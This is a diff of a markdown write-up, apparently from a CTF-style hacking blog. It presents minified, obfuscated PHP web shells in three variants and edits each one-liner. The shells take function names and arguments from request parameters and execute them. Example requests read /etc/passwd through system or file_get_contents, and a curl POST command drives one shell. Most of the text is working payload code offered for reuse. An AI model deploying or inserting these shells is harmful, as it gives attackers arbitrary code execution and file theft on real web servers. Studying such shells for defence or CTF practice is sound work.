@@ -50,7 +50,7 @@ $_[0]($_[1]);
 Thats quite cool but its so fucking huge so i tough i would optimize the hell out of it. So here is my Minified version of it.
 
 ```php
-<?=0;$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]);
+<?=$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]);
 ```
 
 So you can send a request such as ```0=system&1_=cat /etc/passwd```
@@ -59,7 +59,7 @@ The downside is that if you dont have access to the system function you got no r
 so here is another slightly bigger variation of the shell which will print the result of a function.
 
 ```php
-<?=0;$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2]));
+<?=$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2]));
 ```
 
 So you can send a request such as ```0=print_r&1=file_get_contents&2_=/etc/passwd```
@@ -74,7 +74,7 @@ curl https://host.ctf.com/shell.php -X POST -F "0=print_r" -F "1=file_get_conten
 The full tryhard shell can be archived with this snipped:
 
 ```php
-<?=0;$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2],$_[3]));
+<?=$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2],$_[3]));
 ```
 
 With this setup we can run any function with as much arguments as we like.
